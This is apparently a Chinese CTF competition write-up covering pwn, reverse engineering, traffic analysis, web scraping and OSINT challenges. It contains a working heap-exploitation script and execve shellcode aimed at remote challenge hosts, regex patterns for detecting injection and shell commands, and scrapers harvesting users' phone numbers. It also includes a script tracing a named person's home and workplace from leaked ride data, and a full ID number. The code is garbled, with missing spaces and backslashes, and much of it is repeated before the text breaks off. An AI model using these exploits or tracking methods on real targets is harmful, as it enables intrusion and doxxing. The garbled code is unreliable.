# 数据安全积分争夺赛西区wp

> 原文: https://www.ctfiot.com/240445.html
> ID: 240445

提交11行2列765157198323069450

数据安全3

上传phtml文件

然后翻到了文件

数据安全5

2.31的uaf，泄露libc后直接free hook写one_gadget：

from pwn import *
libc = ELF("./libc-2.31.so")
# context.log_level = 'debug'
p = remote("139.196.255.212", 32880)
# p = process("./boh")
def add(size):
    p.sendlineafter(b"->>>>>>", b"1")
    p.sendlineafter(b"How much storage:", str(size).encode())

def free(idx):
    p.sendlineafter(b"->>>>>>", b"2")
    p.sendlineafter(b"Which storage space: ", str(idx).encode())

def show(idx):
    p.sendlineafter(b"->>>>>>", b"3")
    p.sendlineafter(b"show data: n", str(idx).encode())

def edit(idx, data):
    p.sendlineafter(b"->>>>>>", b"4")
    p.sendlineafter(b"Which storage space:", str(idx).encode())
    p.sendlineafter(b"data:", data)

add(0x508)
add(0x508)
add(0x20)

free(0)
show(0)
libc.address = u64(p.recvuntil(b'n')[:-1].ljust(8, b'x00')) - 0x1ECBE0
# one_gadget = libc.address + 0xe3afe
one_gadget = libc.address + 0xe3b01
# one_gadget = libc.address + 0xe3b04
success(f"libc: {hex(libc.address)}")
add(0x508)
add(0x38)   # 4
add(0x38)
add(0x38)
add(0x38)
add(0x18)
free(7)
free(6)
free(5)
free(4)
edit(4, p64(libc.sym['__free_hook']))
add(0x38)   # 9
add(0x38)   # 10
edit(10, p64(one_gadget))
free(0)
p.interactive()

提交8列2行：

725567201628166747

 

数据安全7

插入了大量的花指令，手动nop掉后还原出逻辑：

main函数读取256字节然后送入加密函数：

__int64 __fastcall main(int a1, char **a2, char **a3)
{

  stream = fopen("./info_0c743b3.ori", "r");
if ( !stream )
    return0xFFFFFFFFLL;
  s = fopen("info_0c743b3.ori.en", "ab+");
do
  {
    if ( !fgets(file_src, 256, stream) )
      break;
    i = strlen(file_src);
    n = 0;
    ptr = enc(file_src, i, (size_t)&n);
    i = n;
    v6 = fwrite(ptr, 1uLL, n, s);
    fwrite("rn", 1uLL, 2uLL, s);
  }
while ( v6 != -1 );
  fclose(stream);
  fclose(s);
return0LL;
}

加密函数：

void *__fastcall enc(char *input_buffer, unsigned int length, size_t n_1)
{
  input_len = 0;
  *(_BYTE *)(v3 - 117) = __ROR1__(*(_BYTE *)(v3 - 117), 1);
memcpy(dest, (constvoid *)(unsignedint)v3, n_1);
  input_len = length;
  n4096 = 4096;
  ptr = malloc(0x1000uLL);
if ( !ptr )
    return0LL;
  addr = (void *)((unsigned __int64)ptr & 0xFFFFFFFFFFFFF000LL);
if ( mprotect((void *)((unsigned __int64)ptr & 0xFFFFFFFFFFFFF000LL), n4096, 7) == -1 )
  {
    free(ptr);
    return0LL;
  }
else
  {
    for ( i = 0; i < input_len; ++i )
    {
      ptr_1 = ptr;
      *(_QWORD *)ptr = *(_QWORD *)sub_404080;
      ptr_1[1] = loc_404088;
      ptr_1[2] = loc_404090;
      ptr_1[3] = loc_404098;
      ptr_1[4] = loc_4040A0;
      ptr_1[5] = loc_4040A8;
      ptr_1[6] = loc_4040B0;
      ptr_1[7] = loc_4040B8;
      ptr_1[8] = loc_4040C0;
      ptr_1[9] = *(_QWORD *)((char *)&loc_4040C7 + 1);
      ptr_1[10] = loc_4040D0;
      ptr_1[11] = *(_QWORD *)((char *)&loc_4040D7 + 1);
      *((_DWORD *)ptr_1 + 24) = loc_4040E0;
      *((_WORD *)ptr_1 + 50) = *(_WORD *)((char *)&loc_4040E3 + 1);
      *((_BYTE *)ptr_1 + 102) = locret_4040E6;
      v12 = ((__int64 (__fastcall *)(_QWORD))ptr)((unsignedint)dest[i]);
      dest[i] = v12;
    }
    free(ptr);
    strcpy(key, "103906d6c9429372");
    memset(enc_result, 0, sizeof(enc_result));
    unknow = 0LL;
    v14 = strlen(key);
    init_key(cryptor, key, v14);
    sub_401453(cryptor, (__int64)dest, input_len);
    src = sub_401628(dest, input_len, &input_len);
    memcpy(dest, src, input_len);
    *(_DWORD *)n_1 = input_len;
    return dest;
  }
}

逻辑是加载并执行了一段自解密的shellode，用0xd3异或，然后似乎准备了一个key，并进行了加密，特征类似于RC4，调试后发现对RC4做了轻微魔改，最后用一个表转换成16进制字符串

shellcode经过调试后得到：

// positive sp value has been detected, the output may be wrong!
char __fastcall sub_404088(char a1)
{
  return (((16 * ((a1 - 1) & 0xF)) | ((__int64)(unsigned __int8)(a1 - 1) >> 4) & 0xF) ^ 0xB2) + 7;
}

结合调试写出加密流程，比对加密结果和题目提供的程序相同：

src_data = open("./info_0c743b3.ori", "rb").read()
key = "103906d6c9429372"

defrc4_init_sbox(key):
    s_box = list(range(256)) 
    j = 0
    for i inrange(256):
        j = (j + s_box[i] + ord(key[i % len(key)]) + 4) % 256
        s_box[i], s_box[j] = s_box[j], s_box[i]
    return s_box
    
defrc4_excrypt(plain, box):
    res = []
    i = j = 0
    for s in plain:
        i = (i + 1) % 256
        j = (j + box[i]) % 256
        box[i], box[j] = box[j], box[i]
        t = (box[i] + box[j] + 15) % 256
        k = box[t]
        res.append(s ^ k)
    return  res

deftranslate(input):
    result = ''
    dict2 = "208EC37FD94165AB"
    dict1 = "0123456789abcdef"
    for i ininput:
        result += hex(i).replace("0x", "").rjust(2, "0")
    return result.translate(str.maketrans(dict1, dict2))

defshellcode(input):
    return (((((input - 1) & 0xf) << 4) | (((input - 1) >> 4) & 0xf)) ^ 0xb2) + 7

withopen("./info_0c743b3.ori.en.my", "w") as f:
    for i inrange(len(src_data) // 255):
        block = bytearray(src_data[i * 255 : (i + 1) * 255])
        for j inrange(255):
            block[j] = shellcode(block[j])
        sbox = rc4_init_sbox(key)
        enc_result = rc4_excrypt(block, sbox)
        result = translate(enc_result)
        f.write(result)
        f.write("rn")
    else:
        block = bytearray(src_data[(i + 1) * 255 :])
        for j inrange(len(block)):
            block[j] = shellcode(block[j])
        sbox = rc4_init_sbox(key)
        enc_result = rc4_excrypt(block, sbox)
        result = translate(enc_result)
        f.write(result)
        f.write("rn")

然后写出解密脚本：

key = "103906d6c9429372"

defrc4_init_sbox(key):
    s_box = list(range(256)) 
    j = 0
    for i inrange(256):
        j = (j + s_box[i] + ord(key[i % len(key)]) + 4) % 256
        s_box[i], s_box[j] = s_box[j], s_box[i]
    return s_box
    
defrc4_excrypt(plain, box):
    res = []
    i = j = 0
    for s in plain:
        i = (i + 1) % 256
        j = (j + box[i]) % 256
        box[i], box[j] = box[j], box[i]
        t = (box[i] + box[j] + 15) % 256
        k = box[t]
        res.append(s ^ k)
    return  res

deftranslate(input):
    dict2 = "208EC37FD94165AB"
    dict1 = "0123456789abcdef"
    returninput.translate(str.maketrans(dict2, dict1))

defreverse_shellcode(output):
    output -= 7
    output ^= 0xb2
    low = (output >> 4) & 0xf
    high = output & 0xf
    input = (high << 4) | low
    returninput + 1

result = ""
withopen("./info_0c743b3.ori.en", "r") as f:
    content = f.readlines()

for line in content:
    l = line.replace("n", "")
    l = translate(l)
    sbox = rc4_init_sbox(key)
    dec_result = rc4_excrypt(bytes.fromhex(l), sbox)
    for i inrange(len(dec_result)):
        dec_result[i] = reverse_shellcode(dec_result[i])
    for i in dec_result:
        result += chr(i)

open("./info_0c743b3.ori", "wb").write(result.encode())

打开重要文件docx，发现flag

1

数据分析2

取出来内存.7z，然后，用rs扫，发现了很多日志

然后找到了，攻击的ip

flag就是114.10.143.92

数据攻防1

打开流量包，看到最下面

明显的bool盲注流量，我们导出数据包

tshark -r test.pcapng -T fields -Y "http and http.request.uri.query.parameter contains "fl4g_1s_here"" -e "http.request.uri.query.parameter" > data.txt

然后手动，统计再转成hex

数据攻防2

tcp contains "upload" and http.request.method==POST

模型安全任务1

爬虫：

import requests
from bs4 import BeautifulSoup
import time
import pandas as pd

BASE_URL = "http://47.117.186.156:33088"
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
    "Cookie": "PHPSESSID=meth5ucqp7rc26dtbvf93qof2g",  # 替换为你自己的
}

# 所有评论结果会保存在这个列表里
data = []

defget_product_ids(page=1):
    url = f"{BASE_URL}/index.php?controller=home&action=index&page={page}"
    res = requests.get(url, headers=HEADERS)
    soup = BeautifulSoup(res.text, 'html.parser')
    product_cards = soup.select('.product-card')
    product_ids = [card['data-id'] for card in product_cards]
    return product_ids

defget_comments(product_id):
    url = f"{BASE_URL}/index.php?controller=product&action=detail&id={product_id}"
    res = requests.get(url, headers=HEADERS)
    soup = BeautifulSoup(res.text, 'html.parser')
    reviews = soup.select('.review-item')

    for review in reviews:
        try:
            user_id = review.select_one('.user-id').text.strip().replace("用户ID：", "")
            user_name = review.select_one('.reviewer-name').text.strip().replace("用户名：", "")
            phone = review.select_one('.reviewer-phone').text.strip().replace("联系电话：", "")
            comment = review.select_one('.review-content').text.strip()
            data.append({
                "user_id": int(user_id),
                "user_name": user_name,
                "phone": phone,
                "comment": comment
            })
        except Exception as e:
            print(f"解析评论失败: {e}")

defrun_scraper():
    total_pages = 84# 示例先爬5页，可以调整为 84
    for page inrange(1, total_pages + 1):
        print(f"爬取第 {page} 页商品列表...")
        product_ids = get_product_ids(page)
        for pid in product_ids:
            print(f" -> 获取商品 {pid} 评论")
            get_comments(pid)
            time.sleep(0.5)  # 防止请求过快被封
        time.sleep(1)

    # 保存结果
    df = pd.DataFrame(data)
    df.to_csv("raw_comments.csv", index=False, encoding='utf-8')
    print("✅ 数据已保存到 raw_comments.csv")

if __name__ == "__main__":
    run_scraper()

计算：

import pandas as pd
from snownlp import SnowNLP
import hashlib

# === 1. 加载爬虫结果 ===
df = pd.read_csv("raw_comments.csv", encoding='utf-8')

# === 2. 情感分析：snownlp ===
defpredict_sentiment(text):
    try:
        s = SnowNLP(str(text))
        # 返回值在0~1之间，>0.5是正向，<=0.5是负向
        return1if s.sentiments > 0.5else0
    except:
        return0# 默认负面

df['label'] = df['comment'].apply(predict_sentiment)

# === 3. MD5 签名 ===
defgenerate_signature(user_id, user_name, phone):
    raw = f"{user_id}{user_name}{phone}"
    return hashlib.md5(raw.encode('utf-8')).hexdigest()

df['signature'] = df.apply(lambda row: generate_signature(row['user_id'], row['user_name'], row['phone']), axis=1)

# === 4. 整理、排序、导出 ===
output_df = df[['user_id', 'label', 'signature']].sort_values(by='user_id')
output_df.to_csv("submit_1.csv", index=False, encoding='utf-8')

print("✅ submit_1.csv 已生成，准备提交平台评分！")

模型安全任务2

爬虫

import requests
from bs4 import BeautifulSoup
import time
import pandas as pd

BASE_URL = "http://47.117.186.156:33088"
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Cookie": "PHPSESSID=meth5ucqp7rc26dtbvf93qof2g"# 请替换为你的有效会话ID
}

all_products = []

defget_product_list(page=1):
    url = f"{BASE_URL}/index.php?controller=home&action=index&page={page}"
    res = requests.get(url, headers=HEADERS)
    soup = BeautifulSoup(res.text, "html.parser")
    product_cards = soup.select(".product-card")

    products = []
    for card in product_cards:
        try:
            product_id = int(card['data-id'])
            product_name = card.select_one('.product-name').text.strip()
            sales_text = card.select_one('.product-sales').text.strip()  # 月销量: XXX件
            sales_num = int(''.join(filter(str.isdigit, sales_text)))
        except Exception as e:
            print(f"解析首页产品失败: {e}")
            continue

        products.append({
            "product_id": product_id,
            "product_name": product_name,
            "sales": sales_num
        })
    return products

defget_product_comments(product_id):
    url = f"{BASE_URL}/index.php?controller=product&action=detail&id={product_id}"
    res = requests.get(url, headers=HEADERS)
    soup = BeautifulSoup(res.text, "html.parser")
    reviews = soup.select('.review-content')
    comments = [r.text.strip() for r in reviews]
    return comments

defrun_product_scraper():
    total_pages = 84# 建议先测试前 5 页，平台总页数是 84
    for page inrange(1, total_pages + 1):
        print(f"正在爬取第 {page} 页商品列表...")
        products = get_product_list(page)
        for p in products:
            print(f" -> 商品ID: {p['product_id']} 正在抓取评论...")
            comments = get_product_comments(p['product_id'])
            for comment in comments:
                all_products.append({
                    "product_id": p['product_id'],
                    "product_name": p['product_name'],
                    "sales": p['sales'],
                    "comment": comment
                })
            # 若无评论也要保留记录（用于后续生成 reviews_number = 0）
            ifnot comments:
                all_products.append({
                    "product_id": p['product_id'],
                    "product_name": p['product_name'],
                    "sales": p['sales'],
                    "comment": ""
                })
            time.sleep(0.3)
        time.sleep(1)

    # 保存为中间文件
    df = pd.DataFrame(all_products)
    df.to_csv("product_detail_data.csv", index=False, encoding='utf-8')
    print("✅ 爬取完成，数据已保存为 product_detail_data.csv")

if __name__ == "__main__":
    run_product_scraper()

计算

import pandas as pd
import re
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.naive_bayes import MultinomialNB
from sklearn.preprocessing import LabelEncoder
from sklearn.pipeline import make_pipeline

# === 加载标注数据 ===
train_df = pd.read_csv("product_names_to_label.csv")  # 你标注的训练集
X_train = train_df['product_name']
y_train = train_df['category_id']

# 标签编码
label_encoder = LabelEncoder()
y_encoded = label_encoder.fit_transform(y_train)

# 构建模型（TF-IDF + MultinomialNB）
model = make_pipeline(
    TfidfVectorizer(),
    MultinomialNB()
)
model.fit(X_train, y_encoded)

# === 加载商品详情数据 ===
full_df = pd.read_csv("product_detail_data.csv")

# === 分类预测 ===
X_test = full_df['product_name']
y_pred_encoded = model.predict(X_test)
y_pred = label_encoder.inverse_transform(y_pred_encoded)
full_df['category_id'] = y_pred

# === 清洗销量 ===
defclean_sales(s):
    try:
        val = int(re.sub(r"D", "", str(s)))
        return val if val > 0else0
    except:
        return0

full_df['sales'] = full_df['sales'].apply(clean_sales)

# === 评论统计 ===
reviews = full_df.groupby('product_id')['comment'].apply(
    lambda x: x[x != ""].count()
).reset_index(name='reviews_number')

# === 整合 & 去重 ===
product_df = full_df.drop_duplicates(subset=['product_id'])[['product_id', 'sales', 'category_id']]
final_df = product_df.merge(reviews, on='product_id', how='left')
final_df['reviews_number'] = final_df['reviews_number'].fillna(0).astype(int)

# === 排序 & 导出 ===
final_df = final_df.sort_values(by='product_id')
final_df.to_csv("submit_2.csv", index=False, encoding='utf-8')
print("✅ submit_2.csv 已成功生成！")

模型安全任务3

爬虫

import requests
from bs4 import BeautifulSoup
import pandas as pd
import time

BASE_URL = "http://47.117.186.156:33088"
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Cookie": "PHPSESSID=meth5ucqp7rc26dtbvf93qof2g"# ⚠️ 替换为你的有效 Cookie
}

all_users = []

defget_product_ids(page):
    url = f"{BASE_URL}/index.php?controller=home&action=index&page={page}"
    res = requests.get(url, headers=HEADERS)
    soup = BeautifulSoup(res.text, 'html.parser')
    product_cards = soup.select('.product-card')
    return [card['data-id'] for card in product_cards]

defget_review_users(product_id):
    url = f"{BASE_URL}/index.php?controller=product&action=detail&id={product_id}"
    res = requests.get(url, headers=HEADERS)
    soup = BeautifulSoup(res.text, 'html.parser')
    reviews = soup.select('.review-item')

    for review in reviews:
        try:
            user_id = review.select_one('.user-id').text.replace("用户ID：", "").strip()
            phone = review.select_one('.reviewer-phone').text.replace("联系电话：", "").strip()
            user_agent = review.select_one('.user-agent').text.replace("使用设备：", "").strip()

            all_users.append({
                'user_id': int(user_id),
                'phone': phone,
                'user_agent': user_agent
            })
        except Exception as e:
            print(f"跳过一个评论，原因：{e}")

defrun_scraper():
    for page inrange(1, 85):  # 示例：先抓前5页商品（共84页）
        print(f"🛒 抓取商品列表页 {page}...")
        product_ids = get_product_ids(page)
        for pid in product_ids:
            print(f"   📦 商品ID {pid} - 抓取评论用户信息")
            get_review_users(pid)
            time.sleep(0.5)
        time.sleep(1)

    df = pd.DataFrame(all_users).drop_duplicates()
    df.to_csv("user_agent_data.csv", index=False, encoding='utf-8')
    print("✅ 数据已保存为 user_agent_data.csv")

if __name__ == "__main__":
    run_scraper()

计算

import pandas as pd
import re

# === 读取数据 ===
df = pd.read_csv("user_agent_data.csv", encoding='utf-8')  # 修改为你的文件路径

# === 手机号脱敏 ===
defdesensitize(phone):
    phone = str(phone)
    iflen(phone) == 11and phone.isdigit():
        return phone[:3] + '****' + phone[-4:]
    return phone

df['desensitization'] = df['phone'].apply(desensitize)

# === 更宽松但稳健的恶意代码检测规则 ===
defis_malicious_ua(ua: str) -> bool:
    ua = str(ua).lower()

    # 精选高置信度攻击特征
    patterns = [
        r"<script.*?>.*?</script>",     # script标签
        r"alerts*(.*?)",             # alert()
        r"evals*(.*?)",              # eval()
        r"onerrors*=",                 # onerror=
        r"onloads*=",
        r"javascript:",

        r"b(selects+.*s+from|unions+select|drops+table|inserts+into|deletes+from)b",  # SQL结构
        r"b(select|insert|update|delete|drop|union|exec|sleep|like)b",
        # r"'[s]*or[s]*'1'='1",         # 常见注入语句
        r"b(cmd|powershell|sh|bash)b"# 命令执行
    ]

    for pattern in patterns:
        if re.search(pattern, ua, re.IGNORECASE):
            returnTrue
    returnFalse

# 应用检测
df['code_check'] = df['user_agent'].apply(lambda ua: 'FALSE'if is_malicious_ua(ua) else'TRUE')

# === 最终输出 submit_3.csv ===
submit_df = df[['user_id', 'desensitization', 'code_check']].sort_values(by='user_id')
submit_df.to_csv("submit_3.csv", index=False, encoding='utf-8')
print("✅ 成功生成 submit_3.csv，已完成脱敏与宽松恶意检测！")

 

数据社工1

用脚本跑某滴泄露数据，提取出可能是张华强的经纬度，然后去地图数据搜索经纬度得到
华润国际E区:闵行区星辰信息技术园

import os
import sqlite3
from collections import defaultdict, Counter
from datetime import datetime
import folium

# 你的.db文件夹路径
DB_FOLDER = './某滴泄露的行程数据/'

# 判断是否为工作日
defis_weekday(date_str):
    try:
        return datetime.strptime(date_str, "%Y-%m-%d").weekday() < 5
    except:
        returnFalse

# 是否为工作地关键词
defis_workplace(name):
    returnany(kw in name for kw in ['园区', '大厦', '大楼'])

# 临时存储每个“张**”人员的行程数据
people = defaultdict(list)

# 遍历所有 .db 文件
for filename insorted(os.listdir(DB_FOLDER)):
    ifnot filename.endswith('.db'):
        continue
    db_path = os.path.join(DB_FOLDER, filename)
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()

    try:
        cursor.execute("SELECT date, name, phone, latitude, longitude FROM location_data WHERE name LIKE '张__'")
        rows = cursor.fetchall()
        for row in rows:
            date, name, phone, lat, lng = row
            key = phone.strip()  # 以手机号为区分标识
            people[key].append({
                "date": date,
                "name": name,
                "phone": phone,
                "lat": float(lat),
                "lng": float(lng),
                "filename": filename
            })
    except Exception as e:
        print(f"读取 {filename} 出错：{e}")
    finally:
        conn.close()

# 对每个“张**”人员评估是否符合“张华强”通勤模式
candidate_scores = []
commute_data = {}

for phone, records in people.items():
    records.sort(key=lambda x: (x['date'], x['filename']))  # 排序模拟时间
    by_day = defaultdict(list)
    for r in records:
        by_day[r['date']].append(r)

    commute_days = 0
    home_locations = []
    work_locations = []
    work_names = []

    for date, logs in by_day.items():
        ifnot is_weekday(date) orlen(logs) < 2:
            continue
        start = logs[0]
        end = logs[-1]
        home_locations.append((round(start['lat'], 6), round(start['lng'], 6)))
        work_locations.append((round(end['lat'], 6), round(end['lng'], 6)))
        work_names.append(end['name'])
        commute_days += 1

    if commute_days < 5:
        continue# 过滤通勤太少的

    # 统计出现频率最高的 home、work 地点
    home_common = Counter(home_locations).most_common(1)
    work_common = Counter(work_locations).most_common(1)
    work_named_common = Counter(work_names).most_common(1)

    workplace_match = is_workplace(work_named_common[0][0])
    score = commute_days + (5if workplace_match else0) + home_common[0][1]

    candidate_scores.append((score, phone, home_common[0][0], work_common[0][0], work_named_common[0][0]))
    commute_data[phone] = {
        "home": home_common[0][0],
        "work": work_common[0][0],
        "work_name": work_named_common[0][0],
        "paths": list(zip(home_locations, work_locations))
    }

# 选出得分最高的候选人作为“张华强”
best = sorted(candidate_scores, reverse=True)[0]
_, best_phone, home_loc, work_loc, work_name = best
paths = commute_data[best_phone]["paths"]

# 打印结果
print("🔍 推测张华强身份如下：")
print(f"手机：{best_phone}")
print(f"🏡 居住地坐标：{home_loc}")
print(f"🏢 工作地坐标：{work_loc}")
print(f"工作地点名称：{work_name}")

# 🗺 可视化地图生成
m = folium.Map(location=home_loc, zoom_start=12)

# 居住地标记
folium.Marker(location=home_loc, popup="🏡 居住地", icon=folium.Icon(color='green', icon='home')).add_to(m)

# 工作地标记
folium.Marker(location=work_loc, popup=f"🏢 工作地：{work_name}", icon=folium.Icon(color='red', icon='briefcase')).add_to(m)

# 画线
for home, work in paths[:100]:
    folium.PolyLine([home, work], color='blue', weight=1, opacity=0.4).add_to(m)

# 保存地图
m.save("张华强_行程地图.html")
print("✅ 地图保存为：张华强_行程地图.html")

# python solve1.py
# 🔍 推测张华强身份如下：
# 手机：138****9377
# 🏡 居住地坐标：(14.445597, 51.019517)
# 🏢 工作地坐标：(14.447202, 51.02654)
# 工作地点名称：张**
# ✅ 地图保存为：张华强_行程地图.html

# 华润国际E区:闵行区星辰信息技术园

数据社工2，3

直接搜索张华强的时候搜到的手机号和公司

数据社工4

61050119980416547X，也是直接搜张华强就有了


```
import gmpy2
from gmpy2 import mpz, isqrt, powmod

def find_minimal_solution(D):
    """使用连分数展开法，找到 Pell 方程 x² - D*y² = 1 的最小整数解 (x, y)"""
    m0 = isqrt(D)
    if m0 * m0 == D:
        return None  # 完全平方数无解

    a0 = m0
    d = mpz(1)
    m = mpz(m0)

    h0, h1 = mpz(1), mpz(a0)
    k0, k1 = mpz(0), mpz(1)

    while True:
        d_new = (D - m * m) // d
        a = (a0 + m) // d_new
        m = a * d_new - m

        h2 = a * h1 + h0
        k2 = a * k1 + k0

        if h2 * h2 - D * k2 * k2 == 1:
            return h2, k2

        h0, h1 = h1, h2
        k0, k1 = k1, k2
        d = d_new

def generate_solutions(x1, y1, D):
    """根据最小解 (x1, y1) 递推生成更多解 (x, y)"""
    x, y = x1, y1
    yield x, y
    while True:
        x_new = x1 * x + D * y1 * y
        y_new = x1 * y + y1 * x
        x, y = x_new, y_new
        yield x, y

def verify_arithmetic_sequence(n1, n2):
    """验证是否满足 CTF 的等差数列关系式"""
    lhs = n1 * (n1 ** 2 - n1 + 2)
    rhs = 5279 * n2 * (2 * n2 ** 2 - 3 * n2 + 3)
    return lhs == rhs

def main():
    D = mpz(42232)
    required_y = mpz(1) << 5279  # 2^5279

    print("🔍 正在查找 Pell 方程最小解...")
    minimal_solution = find_minimal_solution(D)
    if minimal_solution is None:
        print("❌ D 是完全平方数，无非平凡解")
        return

    x1, y1 = minimal_solution
    print(f"✅ 最小解：x = {x1}, y = {y1}")

    print(f"n📈 开始生成解，直到 y > 2^5279 ≈ {required_y.bit_length()} 位二进制...")
    for x, y in generate_solutions(x1, y1, D):
        if y > required_y:
            n1 = (x - 1) // 2
            n2 = y
            print(f"n🎯 找到满足条件的解：nn1 = {n1}nn2 = {n2}")
            print(f"n🧪 验证等差数列关系式...", end=' ')
            if verify_arithmetic_sequence(n1, n2):
                print("✅ 验证通过！")
            else:
                print("❌ 验证失败！")
            break

if __name__ == "__main__":
    main()
```



```
and esi, ecx
push rsi
mov r11, 0x00ff732fffffff2f
mov r8,  0x0097000091969d00
push r8
pop rax
sub r11, rax
push r11
push rsp
pop rdi
imul esi
mov eax, 0x3b
push r14
pop rsi
mov edx, 0
syscall
```



```
脚本：
from pwn import *
context.arch = 'amd64'
# 30 4D 4F 79 68 6A 6C 63 69 74 31 5A 6B 62 4E 52 6E 43 48 61 47

# xor esi, esi
# push rsi
# mov rbx, 0x68732f2f6e69622f
# push rbx
# push rsp
# pop rdi
# imul esi
# mov al, 0x3b
# syscall

# p = process("./scsc")
p = remote("47.117.186.156", 33070)
shellcode = b'x95x00x8bx52x2fxf2xbax2axe2x5dx43x22x87x44xa4x6bx56x03xccx31x94xcaxf3xb7x25xaaxc3x4dx65x13xe9xa9x07x5bxe2x12xc2x7bxe4xa7x30xe4x04xd0x32xf2x1ex76xb1xa4xa2xa0xcbx58xfax6bx35xc1xefx6dx95x1cx32x22'
pause()
p.sendlineafter(b"magic data:n", shellcode)
p.interactive()
```



```
from pwn import *
libc = ELF("./libc-2.31.so")
# context.log_level = 'debug'
p = remote("139.196.255.212", 32880)
# p = process("./boh")
def add(size):
    p.sendlineafter(b"->>>>>>", b"1")
    p.sendlineafter(b"How much storage:", str(size).encode())

def free(idx):
    p.sendlineafter(b"->>>>>>", b"2")
    p.sendlineafter(b"Which storage space: ", str(idx).encode())

def show(idx):
    p.sendlineafter(b"->>>>>>", b"3")
    p.sendlineafter(b"show data: n", str(idx).encode())

def edit(idx, data):
    p.sendlineafter(b"->>>>>>", b"4")
    p.sendlineafter(b"Which storage space:", str(idx).encode())
    p.sendlineafter(b"data:", data)

add(0x508)
add(0x508)
add(0x20)

free(0)
show(0)
libc.address = u64(p.recvuntil(b'n')[:-1].ljust(8, b'x00')) - 0x1ECBE0
# one_gadget = libc.address + 0xe3afe
one_gadget = libc.address + 0xe3b01
# one_gadget = libc.address + 0xe3b04
success(f"libc: {hex(libc.address)}")
add(0x508)
add(0x38)   # 4
add(0x38)
add(0x38)
add(0x38)
add(0x18)
free(7)
free(6)
free(5)
free(4)
edit(4, p64(libc.sym['__free_hook']))
add(0x38)   # 9
add(0x38)   # 10
edit(10, p64(one_gadget))
free(0)
p.interactive()
```



```
__int64 __fastcall main(int a1, char **a2, char **a3)
{

  stream = fopen("./info_0c743b3.ori", "r");
if ( !stream )
    return0xFFFFFFFFLL;
  s = fopen("info_0c743b3.ori.en", "ab+");
do
  {
    if ( !fgets(file_src, 256, stream) )
      break;
    i = strlen(file_src);
    n = 0;
    ptr = enc(file_src, i, (size_t)&n);
    i = n;
    v6 = fwrite(ptr, 1uLL, n, s);
    fwrite("rn", 1uLL, 2uLL, s);
  }
while ( v6 != -1 );
  fclose(stream);
  fclose(s);
return0LL;
}
```



```
void *__fastcall enc(char *input_buffer, unsigned int length, size_t n_1)
{
  input_len = 0;
  *(_BYTE *)(v3 - 117) = __ROR1__(*(_BYTE *)(v3 - 117), 1);
memcpy(dest, (constvoid *)(unsignedint)v3, n_1);
  input_len = length;
  n4096 = 4096;
  ptr = malloc(0x1000uLL);
if ( !ptr )
    return0LL;
  addr = (void *)((unsigned __int64)ptr & 0xFFFFFFFFFFFFF000LL);
if ( mprotect((void *)((unsigned __int64)ptr & 0xFFFFFFFFFFFFF000LL), n4096, 7) == -1 )
  {
    free(ptr);
    return0LL;
  }
else
  {
    for ( i = 0; i < input_len; ++i )
    {
      ptr_1 = ptr;
      *(_QWORD *)ptr = *(_QWORD *)sub_404080;
      ptr_1[1] = loc_404088;
      ptr_1[2] = loc_404090;
      ptr_1[3] = loc_404098;
      ptr_1[4] = loc_4040A0;
      ptr_1[5] = loc_4040A8;
      ptr_1[6] = loc_4040B0;
      ptr_1[7] = loc_4040B8;
      ptr_1[8] = loc_4040C0;
      ptr_1[9] = *(_QWORD *)((char *)&loc_4040C7 + 1);
      ptr_1[10] = loc_4040D0;
      ptr_1[11] = *(_QWORD *)((char *)&loc_4040D7 + 1);
      *((_DWORD *)ptr_1 + 24) = loc_4040E0;
      *((_WORD *)ptr_1 + 50) = *(_WORD *)((char *)&loc_4040E3 + 1);
      *((_BYTE *)ptr_1 + 102) = locret_4040E6;
      v12 = ((__int64 (__fastcall *)(_QWORD))ptr)((unsignedint)dest[i]);
      dest[i] = v12;
    }
    free(ptr);
    strcpy(key, "103906d6c9429372");
    memset(enc_result, 0, sizeof(enc_result));
    unknow = 0LL;
    v14 = strlen(key);
    init_key(cryptor, key, v14);
    sub_401453(cryptor, (__int64)dest, input_len);
    src = sub_401628(dest, input_len, &input_len);
    memcpy(dest, src, input_len);
    *(_DWORD *)n_1 = input_len;
    return dest;
  }
}
```



```
// positive sp value has been detected, the output may be wrong!
char __fastcall sub_404088(char a1)
{
  return (((16 * ((a1 - 1) & 0xF)) | ((__int64)(unsigned __int8)(a1 - 1) >> 4) & 0xF) ^ 0xB2) + 7;
}
```



```
src_data = open("./info_0c743b3.ori", "rb").read()
key = "103906d6c9429372"

defrc4_init_sbox(key):
    s_box = list(range(256)) 
    j = 0
    for i inrange(256):
        j = (j + s_box[i] + ord(key[i % len(key)]) + 4) % 256
        s_box[i], s_box[j] = s_box[j], s_box[i]
    return s_box
    
defrc4_excrypt(plain, box):
    res = []
    i = j = 0
    for s in plain:
        i = (i + 1) % 256
        j = (j + box[i]) % 256
        box[i], box[j] = box[j], box[i]
        t = (box[i] + box[j] + 15) % 256
        k = box[t]
        res.append(s ^ k)
    return  res

deftranslate(input):
    result = ''
    dict2 = "208EC37FD94165AB"
    dict1 = "0123456789abcdef"
    for i ininput:
        result += hex(i).replace("0x", "").rjust(2, "0")
    return result.translate(str.maketrans(dict1, dict2))

defshellcode(input):
    return (((((input - 1) & 0xf) << 4) | (((input - 1) >> 4) & 0xf)) ^ 0xb2) + 7

withopen("./info_0c743b3.ori.en.my", "w") as f:
    for i inrange(len(src_data) // 255):
        block = bytearray(src_data[i * 255 : (i + 1) * 255])
        for j inrange(255):
            block[j] = shellcode(block[j])
        sbox = rc4_init_sbox(key)
        enc_result = rc4_excrypt(block, sbox)
        result = translate(enc_result)
        f.write(result)
        f.write("rn")
    else:
        block = bytearray(src_data[(i + 1) * 255 :])
        for j inrange(len(block)):
            block[j] = shellcode(block[j])
        sbox = rc4_init_sbox(key)
        enc_result = rc4_excrypt(block, sbox)
        result = translate(enc_result)
        f.write(result)
        f.write("rn")
```



```
key = "103906d6c9429372"

defrc4_init_sbox(key):
    s_box = list(range(256)) 
    j = 0
    for i inrange(256):
        j = (j + s_box[i] + ord(key[i % len(key)]) + 4) % 256
        s_box[i], s_box[j] = s_box[j], s_box[i]
    return s_box
    
defrc4_excrypt(plain, box):
    res = []
    i = j = 0
    for s in plain:
        i = (i + 1) % 256
